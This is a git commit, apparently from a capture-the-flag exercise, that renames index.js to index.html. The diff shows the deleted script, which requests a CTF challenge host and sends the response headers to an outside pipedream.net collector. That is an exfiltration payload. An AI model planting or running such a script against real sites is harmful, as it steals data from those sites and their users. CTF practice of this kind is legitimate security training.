f5e711501422af197aaeac12e103d9dee93105c6
as3617 <46442697+as3617@users.noreply.github.com>
2020-03-15 14:13:46 +0900

    Update and rename index.js to index.html

--- index.js
+++
@@ -1,8 +0,0 @@
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://catweb.zajebistyc.tf/");
-xhr.onreadystatechange = function() {
-    text = xhr.responseText;
-    console.log(xhr.getAllResponseHeaders());
-    fetch('https://encnu1395lyv7.x.pipedream.net/?q='+xhr.getAllResponseHeaders());
-};
-xhr.send(null);
